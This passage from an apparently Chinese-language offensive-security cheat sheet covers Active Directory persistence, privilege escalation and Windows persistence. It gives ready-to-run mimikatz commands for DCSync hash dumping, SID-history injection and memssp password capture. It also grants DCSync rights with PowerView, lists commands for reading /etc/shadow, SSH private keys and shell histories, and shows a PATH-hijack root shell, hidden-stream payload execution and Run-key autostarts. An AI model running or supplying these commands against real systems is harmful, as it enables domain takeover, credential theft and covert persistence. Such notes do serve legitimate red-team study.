<p><a target="_blank" rel="noopener" href="https://www.dcshadow.com/">DCshadow</a></p>
<h5 id="security-support-provider"><a class="markdownIt-Anchor" href="#security-support-provider">#</a> Security Support Provider</h5>
<p>简单的理解为 SSP 就是一个 DLL，用来实现身份认证</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">misc::memssp</span><br></pre></td></tr></table></figure>
<p>这样就不需要重启 <code>c:/windows/system32</code>  可看到新生成的文件 kiwissp.log</p>
<h5 id="sid-history"><a class="markdownIt-Anchor" href="#sid-history">#</a> <a target="_blank" rel="noopener" href="https://adsecurity.org/?p=1772">SID History</a></h5>
<p>SID 历史记录允许另一个帐户的访问被有效地克隆到另一个帐户</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz &quot;privilege::debug&quot; &quot;misc::addsid bobafett ADSAdministrator&quot;</span><br></pre></td></tr></table></figure>
<h5 id="adminsdholdersdprop"><a class="markdownIt-Anchor" href="#adminsdholdersdprop">#</a> <a target="_blank" rel="noopener" href="https://adsecurity.org/?p=1906">AdminSDHolder＆SDProp</a></h5>
<p>利用 AdminSDHolder＆SDProp（重新）获取域管理权限</p>
<h5 id="dcsync后门"><a class="markdownIt-Anchor" href="#dcsync后门">#</a> Dcsync 后门</h5>
<p>向域成员赋予 Dcsync 权限</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Powerview.ps1</span><br><span class="line">Add-DomainObjectAcl -TargetIdentity &quot;DC=vulntarget,DC=com&quot; -PrincipalIdentity test1 -Rights DCSync -Verbose</span><br></pre></td></tr></table></figure>
<p>在登录了 test1 域账户的机器上执行 Dcsync 利用操作</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz &quot;lsadump::dcsync /domain:vulntarget.com /all /csv&quot;</span><br></pre></td></tr></table></figure>
<h5 id="组策略"><a class="markdownIt-Anchor" href="#组策略">#</a> 组策略</h5>
<p><a target="_blank" rel="noopener" href="https://adsecurity.org/?p=2716">https://adsecurity.org/?p=2716</a> <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/86531">策略对象在持久化及横向渗透中的应用</a></p>
<h5 id="hook-passwordchangenotify"><a class="markdownIt-Anchor" href="#hook-passwordchangenotify">#</a> Hook PasswordChangeNotify</h5>
<p><a target="_blank" rel="noopener" href="http://www.vuln.cn/6812">http://www.vuln.cn/6812</a></p>
<h5 id="kerberoasting后门"><a class="markdownIt-Anchor" href="#kerberoasting后门">#</a> Kerberoasting 后门</h5>
<p><a target="_blank" rel="noopener" href="https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberoasting">域渗透 - Kerberoasting</a></p>
<h5 id="adminsdholder"><a class="markdownIt-Anchor" href="#adminsdholder">#</a> AdminSDHolder</h5>
<p><a target="_blank" rel="noopener" href="https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence">Backdooring AdminSDHolder for Persistence</a></p>
<h5 id="delegation"><a class="markdownIt-Anchor" href="#delegation">#</a> Delegation</h5>
<p><a target="_blank" rel="noopener" href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#unconstrained-domain-persistence">Unconstrained Domain Persistence</a></p>
<p>证书伪造： <a target="_blank" rel="noopener" href="https://github.com/Ridter/pyForgeCert">pyForgeCert</a></p>
<h1 id="11敏感文件"><a class="markdownIt-Anchor" href="#11敏感文件">#</a> 11. 敏感文件</h1>
<h2 id="windows-2"><a class="markdownIt-Anchor" href="#windows-2">#</a> windows</h2>
<p>敏感配置文件</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">C</span>:\boot.<span class="property">ini</span>     <span class="comment">//查看系统版本</span></span><br><span class="line"><span class="attr">C</span>:\<span class="title class_">Windows</span>\<span class="title class_">System32</span>\inetsrv\<span class="title class_">MetaBase</span>.<span class="property">xml</span>    <span class="comment">//IIS配置文件</span></span><br><span class="line"><span class="attr">C</span>:\<span class="title class_">Windows</span>\repair\sam     <span class="comment">//存储系统初次安装的密码</span></span><br><span class="line"><span class="attr">C</span>:\<span class="title class_">Program</span> <span class="title class_">Files</span>\mysql\my.<span class="property">ini</span>     <span class="comment">//Mysql配置</span></span><br><span class="line"><span class="attr">C</span>:\<span class="title class_">Program</span> <span class="title class_">Files</span>\mysql\data\mysql\user.<span class="property">MYD</span>    <span class="comment">//Mysql root</span></span><br><span class="line"><span class="attr">C</span>:\<span class="title class_">Windows</span>\php.<span class="property">ini</span>    <span class="comment">//php配置信息</span></span><br><span class="line"><span class="attr">C</span>:\<span class="title class_">Windows</span>\my.<span class="property">ini</span>     <span class="comment">//Mysql配置信息</span></span><br><span class="line"><span class="attr">C</span>:\<span class="title class_">Windows</span>\win.<span class="property">ini</span>    <span class="comment">//Windows系统的一个基本系统配置文件</span></span><br></pre></td></tr></table></figure>
<h2 id="linux-2"><a class="markdownIt-Anchor" href="#linux-2">#</a> Linux</h2>
<p>敏感配置文件</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line">#判断是否在docker容器内</span><br><span class="line">/proc/<span class="number">1</span>/cgroup</span><br><span class="line"></span><br><span class="line"># 系统版本</span><br><span class="line">cat /etc/issue</span><br><span class="line"></span><br><span class="line"># 内核版本</span><br><span class="line">cat /proc/version</span><br><span class="line"></span><br><span class="line"># 账户密码</span><br><span class="line">cat /etc/passwd</span><br><span class="line">cat /etc/shadow</span><br><span class="line"></span><br><span class="line"># 环境变量</span><br><span class="line">cat /etc/profile</span><br><span class="line"></span><br><span class="line"># 系统应用(命令)</span><br><span class="line">ls -lah/sbin</span><br><span class="line"></span><br><span class="line"># 安装应用(命令)</span><br><span class="line">la -lah /usr/bin</span><br><span class="line"></span><br><span class="line"># 开机自启</span><br><span class="line">cat /etc/crontab</span><br><span class="line"></span><br><span class="line"># history</span><br><span class="line">cat ~/.<span class="property">bash_history</span></span><br><span class="line">cat ~/.<span class="property">nano_history</span></span><br><span class="line">cat ~/.<span class="property">atftp_history</span></span><br><span class="line">cat ~/.<span class="property">mysql_history</span></span><br><span class="line">cat ~/.<span class="property">php_history</span></span><br><span class="line"></span><br><span class="line"># 网络配置</span><br><span class="line">cat /etc/resolv.<span class="property">conf</span></span><br><span class="line">cat /etc/networks</span><br><span class="line">cat /etc/network/interfaces</span><br><span class="line">cat /etc/sysconfig/network</span><br><span class="line">cat /etc/host.<span class="property">conf</span></span><br><span class="line">cat /etc/hosts</span><br><span class="line">cat /etc/dhcpd.<span class="property">conf</span></span><br><span class="line"></span><br><span class="line"># <span class="title class_">Service</span>配置</span><br><span class="line">cat /etc/apache2/apache2.<span class="property">conf</span></span><br><span class="line">cat /etc/httpd/conf/httpd.<span class="property">conf</span></span><br><span class="line">cat /etc/httpd/conf/httpd2.<span class="property">conf</span></span><br><span class="line">cat /<span class="keyword">var</span>/apache2/config.<span class="property">inc</span></span><br><span class="line">cat /usr/local/etc/nginx/nginx.<span class="property">conf</span></span><br><span class="line">cat /usr/local/nginx/conf/nginx.<span class="property">conf</span></span><br><span class="line">cat /etc/my.<span class="property">cnf</span></span><br><span class="line">cat /etc/mysql/my.<span class="property">cnf</span></span><br><span class="line">cat /<span class="keyword">var</span>/lib/mysql/mysql/user.<span class="property">MYD</span></span><br><span class="line">cat /etc/mongod.<span class="property">conf</span></span><br><span class="line">cat /usr/local/redis/redis.<span class="property">conf</span></span><br><span class="line">cat /etc/redis/redis.<span class="property">conf</span></span><br><span class="line"></span><br><span class="line"># ftp</span><br><span class="line">cat /etc/proftpd.<span class="property">conf</span></span><br><span class="line"></span><br><span class="line"># mail</span><br><span class="line">cat /<span class="keyword">var</span>/mail/root</span><br><span class="line">cat /<span class="keyword">var</span>/spool/mail/root</span><br><span class="line">cat ~/.<span class="property">fetchmailrc</span></span><br><span class="line">cat /etc/procmailrc</span><br><span class="line">cat ~/.<span class="property">procmailrc</span></span><br><span class="line">cat /etc/exim/exim.<span class="property">cf</span></span><br><span class="line">cat /etc/postfix/main.<span class="property">cf</span></span><br><span class="line">cat /etc/mail/sendmail.<span class="property">mc</span></span><br><span class="line">cat /usr/share/sendmail/cf/cf/linux.<span class="property">smtp</span>.<span class="property">mc</span></span><br><span class="line">cat /etc/mail/sendmail.<span class="property">cf</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ssh</span><br><span class="line">cat ~<span class="regexp">/.ssh/</span>authorized_keys</span><br><span class="line">cat ~<span class="regexp">/.ssh/i</span>dentity.<span class="property">pub</span></span><br><span class="line">cat ~<span class="regexp">/.ssh/i</span>dentity</span><br><span class="line">cat ~<span class="regexp">/.ssh/i</span>d_rsa.<span class="property">pub</span></span><br><span class="line">cat ~<span class="regexp">/.ssh/i</span>d_rsa</span><br><span class="line">cat ~<span class="regexp">/.ssh/i</span>d_dsa.<span class="property">pub</span></span><br><span class="line">cat ~<span class="regexp">/.ssh/i</span>d_dsa</span><br><span class="line">cat /etc/ssh/ssh_config</span><br><span class="line">cat /etc/ssh/sshd_config</span><br><span class="line">cat /etc/ssh/ssh_host_dsa_key.<span class="property">pub</span></span><br><span class="line">cat /etc/ssh/ssh_host_dsa_key</span><br><span class="line">cat /etc/ssh/ssh_host_rsa_key.<span class="property">pub</span></span><br><span class="line">cat /etc/ssh/ssh_host_rsa_key</span><br><span class="line">cat /etc/ssh/ssh_host_key.<span class="property">pub</span></span><br><span class="line">cat /etc/ssh/ssh_host_key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># log</span><br><span class="line">ls /<span class="keyword">var</span>/log</span><br><span class="line">cat /etc/httpd/logs/access_log</span><br><span class="line">cat /etc/httpd/logs/access.<span class="property">log</span></span><br><span class="line">cat /etc/httpd/logs/error_log</span><br><span class="line">cat /etc/httpd/logs/error.<span class="property">log</span></span><br><span class="line">cat /<span class="keyword">var</span>/log/apache2/access_log</span><br><span class="line">cat /<span class="keyword">var</span>/log/apache2/access.<span class="property">log</span></span><br><span class="line">cat /<span class="keyword">var</span>/log/apache2/error_log</span><br><span class="line">cat /<span class="keyword">var</span>/log/apache2/error.<span class="property">log</span></span><br><span class="line">cat /<span class="keyword">var</span>/log/apache/access_log</span><br><span class="line">cat /<span class="keyword">var</span>/log/apache/access.<span class="property">log</span></span><br><span class="line">cat /<span class="keyword">var</span>/log/auth.<span class="property">log</span></span><br><span class="line">cat /<span class="keyword">var</span>/log/chttp.<span class="property">log</span></span><br><span class="line">cat /<span class="keyword">var</span>/log/cups/error_log</span><br><span class="line">cat /<span class="keyword">var</span>/log/dpkg.<span class="property">log</span></span><br><span class="line">cat /<span class="keyword">var</span>/log/faillog</span><br><span class="line">cat /<span class="keyword">var</span>/log/httpd/access_log</span><br><span class="line">cat /<span class="keyword">var</span>/log/httpd/access.<span class="property">log</span></span><br><span class="line">cat /<span class="keyword">var</span>/log/httpd/error_log</span><br><span class="line">cat /<span class="keyword">var</span>/log/httpd/error.<span class="property">log</span></span><br><span class="line">cat /<span class="keyword">var</span>/log/lastlog</span><br><span class="line">cat /<span class="keyword">var</span>/log/lighttpd/access.<span class="property">log</span></span><br><span class="line">cat /<span class="keyword">var</span>/log/lighttpd/error.<span class="property">log</span></span><br><span class="line">cat /<span class="keyword">var</span>/log/lighttpd/lighttpd.<span class="property">access</span>.<span class="property">log</span></span><br><span class="line">cat /<span class="keyword">var</span>/log/lighttpd/lighttpd.<span class="property">error</span>.<span class="property">log</span></span><br><span class="line">cat /<span class="keyword">var</span>/log/messages</span><br><span class="line">cat /<span class="keyword">var</span>/log/secure</span><br><span class="line">cat /<span class="keyword">var</span>/log/syslog</span><br><span class="line">cat /<span class="keyword">var</span>/log/wtmp</span><br><span class="line">cat /<span class="keyword">var</span>/log/xferlog</span><br><span class="line">cat /<span class="keyword">var</span>/log/yum.<span class="property">log</span></span><br><span class="line">cat /<span class="keyword">var</span>/run/utmp</span><br><span class="line">cat /<span class="keyword">var</span>/webmin/miniserv.<span class="property">log</span></span><br><span class="line">cat /<span class="keyword">var</span>/www/logs/access_log</span><br><span class="line">cat /<span class="keyword">var</span>/www/logs/access.<span class="property">log</span></span><br><span class="line"></span><br><span class="line"># proc fuzz</span><br><span class="line">/proc/self/fd/<span class="number">32</span></span><br><span class="line">/proc/self/fd/<span class="number">33</span></span><br><span class="line">/proc/self/fd/<span class="number">34</span></span><br><span class="line">/proc/self/fd/<span class="number">35</span></span><br><span class="line">/proc/sched_debug</span><br><span class="line">/proc/mounts</span><br><span class="line">/proc/net/arp</span><br><span class="line">/proc/net/route</span><br><span class="line">/proc/net/tcp</span><br><span class="line">/proc/net/udp</span><br><span class="line">/proc/net/fib_trie</span><br><span class="line">/proc/version</span><br></pre></td></tr></table></figure>
<h1 id="12权限提升"><a class="markdownIt-Anchor" href="#12权限提升">#</a> 12. 权限提升</h1>
<h2 id="windows-3"><a class="markdownIt-Anchor" href="#windows-3">#</a> Windows</h2>
<h3 id="bypass-uac"><a class="markdownIt-Anchor" href="#bypass-uac">#</a> bypass UAC</h3>
<h5 id="常用方法"><a class="markdownIt-Anchor" href="#常用方法">#</a> 常用方法</h5>
<ul>
<li>使用 IFileOperation COM 接口</li>
<li>使用 Wusa.exe 的 extract 选项</li>
<li>远程注入 SHELLCODE 到傀儡进程</li>
<li>DLL 劫持，劫持系统的 DLL 文件</li>
<li>eventvwr.exe and registry hijacking</li>
<li>sdclt.exe</li>
<li>SilentCleanup</li>
<li>wscript.exe</li>
<li>cmstp.exe</li>
<li>修改环境变量，劫持高权限.Net 程序</li>
<li>修改注册表 HKCU\Software\Classes\CLSID，劫持高权限程序</li>
<li>直接提权过 UAC</li>
<li>……</li>
</ul>
<h5 id="常用工具"><a class="markdownIt-Anchor" href="#常用工具">#</a> 常用工具</h5>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/hfiref0x/UACME">UACME</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC">Bypass-UAC</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC/Yamabiko">Yamabiko</a></li>
<li>…</li>
</ul>
<h4 id="提权-2"><a class="markdownIt-Anchor" href="#提权-2">#</a> 提权</h4>
<ul>
<li>windows 内核漏洞提权</li>
</ul>
<blockquote>
<p>检测类:<a target="_blank" rel="noopener" href="https://github.com/GDSSecurity/Windows-Exploit-Suggester">Windows-Exploit-Suggester</a>,<a target="_blank" rel="noopener" href="https://github.com/brianwrf/WinSystemHelper">WinSystemHelper</a>,<a target="_blank" rel="noopener" href="https://github.com/bitsadmin/wesng">wesng</a></p>
</blockquote>
<blockquote>
<p>利用类:<a target="_blank" rel="noopener" href="https://github.com/SecWiki/windows-kernel-exploits">windows-kernel-exploits</a>，<a target="_blank" rel="noopener" href="https://github.com/AlessandroZ/BeRoot.git">BeRoot</a></p>
</blockquote>
<ul>
<li>服务提权</li>
</ul>
<blockquote>
<p>数据库服务，ftp 服务等</p>
</blockquote>
<ul>
<li>WINDOWS 错误系统配置</li>
<li>系统服务的错误权限配置漏洞</li>
<li>不安全的注册表权限配置</li>
<li>不安全的文件 / 文件夹权限配置</li>
<li>计划任务</li>
<li>任意用户以 NT AUTHORITY\SYSTEM 权限安装 msi</li>
<li>提权脚本</li>
</ul>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/HarmJ0y/PowerUp/blob/master/PowerUp.ps1">PowerUP</a>,<a target="_blank" rel="noopener" href="https://github.com/rsmudge/ElevateKit">ElevateKit</a></p>
</blockquote>
<h2 id="linux-3"><a class="markdownIt-Anchor" href="#linux-3">#</a> Linux</h2>
<h4 id="内核溢出提权"><a class="markdownIt-Anchor" href="#内核溢出提权">#</a> 内核溢出提权</h4>
<p><a target="_blank" rel="noopener" href="https://github.com/SecWiki/linux-kernel-exploits">linux-kernel-exploits</a></p>
<h4 id="计划任务"><a class="markdownIt-Anchor" href="#计划任务">#</a> 计划任务</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">crontab -l</span><br><span class="line">ls -alh /var/spool/cron</span><br><span class="line">ls -al /etc/ | grep cron</span><br><span class="line">ls -al /etc/cron*</span><br><span class="line">cat /etc/cron*</span><br><span class="line">cat /etc/at.allow</span><br><span class="line">cat /etc/at.deny</span><br><span class="line">cat /etc/cron.allow</span><br><span class="line">cat /etc/cron.deny</span><br><span class="line">cat /etc/crontab</span><br><span class="line">cat /etc/anacrontab</span><br><span class="line">cat /var/spool/cron/crontabs/root</span><br></pre></td></tr></table></figure>
<h4 id="suid"><a class="markdownIt-Anchor" href="#suid">#</a> SUID</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;</span><br></pre></td></tr></table></figure>
<p>寻找可利用 bin：<a target="_blank" rel="noopener" href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p>
<h4 id="环境变量"><a class="markdownIt-Anchor" href="#环境变量">#</a> 环境变量</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">echo “/bin/sh” &gt; ps</span><br><span class="line">chmod 777 ps</span><br><span class="line">echo $PATH</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">cd /home/raj/script</span><br><span class="line">./shell</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2767">Linux 环境变量提权 - 先知社区)</a></p>
<h4 id="系统服务的错误权限配置漏洞"><a class="markdownIt-Anchor" href="#系统服务的错误权限配置漏洞">#</a> 系统服务的错误权限配置漏洞</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat /var/apache2/config.inc</span><br><span class="line">cat /var/lib/mysql/mysql/user.MYD</span><br><span class="line">cat /root/anaconda-ks.cfg</span><br></pre></td></tr></table></figure>
<h4 id="cve-2021-4034"><a class="markdownIt-Anchor" href="#cve-2021-4034">#</a> CVE-2021-4034</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/berdav/CVE-2021-4034</span><br><span class="line">https://github.com/arthepsy/CVE-2021-4034</span><br></pre></td></tr></table></figure>
<h4 id="不安全的文件文件夹权限配置"><a class="markdownIt-Anchor" href="#不安全的文件文件夹权限配置">#</a> 不安全的文件 / 文件夹权限配置</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cat ~/.bash_history</span><br><span class="line">cat ~/.nano_history</span><br><span class="line">cat ~/.atftp_history</span><br><span class="line">cat ~/.mysql_history</span><br><span class="line">cat ~/.php_history</span><br></pre></td></tr></table></figure>
<h4 id="找存储的明文用户名密码"><a class="markdownIt-Anchor" href="#找存储的明文用户名密码">#</a> 找存储的明文用户名，密码</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">grep -i user [filename]</span><br><span class="line">grep -i pass [filename]</span><br><span class="line">grep -C 5 &quot;password&quot; [filename]</span><br><span class="line">find . -name &quot;*.php&quot; -print0 | xargs -0 grep -i -n &quot;var $password&quot; # Joomla</span><br></pre></td></tr></table></figure>
<h1 id="13权限维持"><a class="markdownIt-Anchor" href="#13权限维持">#</a> 13. 权限维持</h1>
<h2 id="windows-4"><a class="markdownIt-Anchor" href="#windows-4">#</a> Windows</h2>
<h5 id="1-密码记录工具"><a class="markdownIt-Anchor" href="#1-密码记录工具">#</a> 1、密码记录工具</h5>
<p>WinlogonHack WinlogonHack 是一款用来劫取远程 3389 登录密码的工具，在 WinlogonHack 之前有 一个 Gina 木马主要用来截取 Windows 2000 下的密码，WinlogonHack 主要用于截 取 Windows XP 以及 Windows 2003 Server。 键盘记录器 安装键盘记录的目地不光是记录本机密码，是记录管理员一切的密码，比如说信箱，WEB 网页密码等等，这样也可以得到管理员的很多信息。 NTPass 获取管理员口令，一般用 gina 方式来，但有些机器上安装了 pcanywhere 等软件，会导致远程登录的时候出现故障，本软件可实现无障碍截取口令。 Linux 下 openssh 后门 重新编译运行的 sshd 服务，用于记录用户的登陆密码。</p>
<h5 id="2-常用的存储payload位置"><a class="markdownIt-Anchor" href="#2-常用的存储payload位置">#</a> 2、常用的存储 Payload 位置</h5>
<p><strong>WMI</strong> : 存储：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$StaticClass = New-Object Management.ManagementClass(&#x27;root\cimv2&#x27;, $null,$null)</span><br><span class="line">$StaticClass.Name = &#x27;Win32_Command&#x27;</span><br><span class="line">$StaticClass.Put()</span><br><span class="line">$StaticClass.Properties.Add(&#x27;Command&#x27; , $Payload)</span><br><span class="line">$StaticClass.Put() </span><br></pre></td></tr></table></figure>
<p>读取:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$Payload=([WmiClass] &#x27;Win32_Command&#x27;).Properties[&#x27;Command&#x27;].Value</span><br></pre></td></tr></table></figure>
<p><strong>包含数字签名的 PE 文件</strong> 利用文件 hash 的算法缺陷，向 PE 文件中隐藏 Payload，同时不影响该 PE 文件的数字签名 <strong>特殊 ADS</strong> …</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">type putty.exe &gt; ...:putty.exe</span><br><span class="line">wmic process call create c:\test\ads\...:putty.exe</span><br></pre></td></tr></table></figure>
<p>特殊 COM 文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">type putty.exe &gt; \\.\C:\test\ads\COM1:putty.exe</span><br><span class="line">wmic process call create \\.\C:\test\ads\COM1:putty.exe</span><br></pre></td></tr></table></figure>
<p>磁盘根目录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">type putty.exe &gt;C:\:putty.exe </span><br><span class="line">wmic process call create C:\:putty.exe</span><br></pre></td></tr></table></figure>
<h5 id="3-runrunonce-keys"><a class="markdownIt-Anchor" href="#3-runrunonce-keys">#</a> 3、Run/RunOnce Keys</h5>
<p>用户级</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</span><br></pre></td></tr></table></figure>
<p>管理员</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</span><br></pre></td></tr></table></figure>
<h5 id="4-bootexecute-key"><a class="markdownIt-Anchor" href="#4-bootexecute-key">#</a> 4、BootExecute Key</h5>
<p>由于 smss.exe 在 Windows 子系统加载之前启动，因此会调用配置子系统来加载当前的配置单元，具体注册表键值为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HKLM\SYSTEM\CurrentControlSet\Control\hivelist</span><br><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Control\Session Manager</span><br></pre></td></tr></table></figure>
<h5 id="5-userinit-key"><a class="markdownIt-Anchor" href="#5-userinit-key">#</a> 5、Userinit Key</h5>
<p>WinLogon 进程加载的 login scripts, 具体键值：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon</span><br></pre></td></tr></table></figure>
<h5 id="6-startup-keys"><a class="markdownIt-Anchor" href="#6-startup-keys">#</a> 6、Startup Keys</h5>
